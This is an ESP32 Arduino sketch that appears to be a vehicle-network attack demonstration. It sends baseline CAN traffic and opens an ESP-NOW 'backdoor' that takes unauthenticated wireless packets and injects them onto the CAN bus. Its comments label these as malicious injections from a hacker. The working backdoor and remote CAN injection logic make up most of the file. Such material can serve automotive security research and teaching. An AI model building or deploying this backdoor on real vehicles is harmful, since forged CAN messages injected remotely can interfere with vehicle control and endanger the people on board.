#include <SPI.h>
#include <mcp2515.h>
#include <WiFi.h>
#include <esp_now.h>

#define CS_PIN    5
#define SCK_PIN  18
#define MISO_PIN 19
#define MOSI_PIN 23

MCP2515 mcp2515(CS_PIN);
struct can_frame canMsg;

// The structure of the malicious packet we expect from the ESP8266
typedef struct __attribute__((packed)) {
    uint32_t id;
    uint8_t dlc;
    uint8_t data[8];
} AttackPacket;

bool initCAN() {
  mcp2515.reset();
  delay(150);
  if (mcp2515.setBitrate(CAN_125KBPS, MCP_8MHZ) != MCP2515::ERROR_OK) return false;
  mcp2515.setNormalMode();
  return true;
}

// ESP-NOW Receive Callback: This triggers instantly when the hacker broadcasts
void OnDataRecv(const esp_now_recv_info_t *info, const uint8_t *incomingData, int len) {
  if (len == sizeof(AttackPacket)) {
    AttackPacket *atk = (AttackPacket *)incomingData;
    struct can_frame attackMsg;
    
    attackMsg.can_id = atk->id;
    attackMsg.can_dlc = atk->dlc;
    for(int i = 0; i < atk->dlc; i++) {
        attackMsg.data[i] = atk->data[i];
    }

    // High-priority physical injection onto the CAN bus
    if (mcp2515.sendMessage(&attackMsg) == MCP2515::ERROR_OK) {
        Serial.print("\n[!!!] MALICIOUS INJECTION: 0x");
        Serial.println(attackMsg.can_id, HEX);
    }
  }
}

void TaskNormalTraffic(void *pvParameters);

void setup() {
  Serial.begin(115200);
  delay(500);
  
  // 1. Initialize WiFi & ESP-NOW Backdoor
  WiFi.mode(WIFI_STA);
  Serial.print("\n[V2X] Gateway MAC Address: ");
  Serial.println(WiFi.macAddress()); // WE NEED THIS MAC ADDRESS!
  
  if (esp_now_init() != ESP_OK) {
    Serial.println("[ERROR] ESP-NOW Init Failed");
    return;
  }
  esp_now_register_recv_cb(OnDataRecv);
  Serial.println("[V2X] Backdoor Active. Listening for remote commands...");

  // 2. Initialize CAN Bus
  SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN, CS_PIN);
  while (!initCAN()) {
    Serial.println("[ERROR] CAN Init Failed.");
    delay(1000);
  }
  Serial.println("[SUCCESS] CAN Initialized. Starting Baseline...");
  
  xTaskCreatePinnedToCore(TaskNormalTraffic, "TX", 2048, NULL, 1, NULL, 1);
}

void loop() { vTaskDelete(NULL); }

void TaskNormalTraffic(void *pvParameters) {
  uint16_t ids[3] = {0x316, 0x329, 0x080};
  uint8_t payload[3][8] = {
    {5, 20, 0, 0, 20, 0, 0, 0},
    {0, 0, 0, 0, 11, 0, 0, 10},
    {0, 17, 0, 0, 20, 0, 20, 43}
  };
  
  uint8_t idx = 0;
  for (;;) { 
    canMsg.can_id  = ids[idx]; 
    canMsg.can_dlc = 8;
    for(int i = 0; i < 8; i++) canMsg.data[i] = payload[idx][i];

    mcp2515.sendMessage(&canMsg);
    idx = (idx + 1) % 3; 
    vTaskDelay(pdMS_TO_TICKS(10)); 
  }
}